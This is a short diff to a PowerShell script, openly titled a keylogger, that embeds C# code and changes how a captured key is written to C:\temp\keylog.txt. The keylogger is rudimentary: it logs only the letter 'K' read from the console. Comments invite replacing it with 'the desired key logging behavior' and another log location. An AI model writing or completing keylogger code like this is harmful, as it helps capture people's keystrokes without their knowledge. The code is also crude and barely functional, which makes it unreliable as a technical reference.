@@ -1,7 +1,6 @@
 # PowerShell Keylogger using RegisterHotKey function
 
-# Import the necessary .NET assemblies
-Add-Type -TypeDefinition @"
+Add-Type -TypeDefinition @'
 using System;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
@@ -29,16 +28,17 @@ public class Keylogger {
                 // Listen for the hotkey
                 if (Console.ReadKey(true).Key == ConsoleKey.K) {
                     // Log the key (you can modify this to store the data elsewhere)
-                    $key = "K"; # Replace this with the desired key logging behavior
-                    Add-Content -Path "C:\temp\keylog.txt" -Value $key
+                    string key = "K"; // Replace this with the desired key logging behavior
+                    string logPath = "C:\\temp\\keylog.txt"; // Replace this with the desired log file path
+                    System.IO.File.AppendAllText(logPath, key + Environment.NewLine);
                 }
             } catch {
-                # Handle any errors here, or you can choose to ignore them
+                // Handle any errors here, or you can choose to ignore them
             }
         }
     }
 }
-"@
+'@
 
 # Run the Keylogger
 [Keylogger]::Main(@())
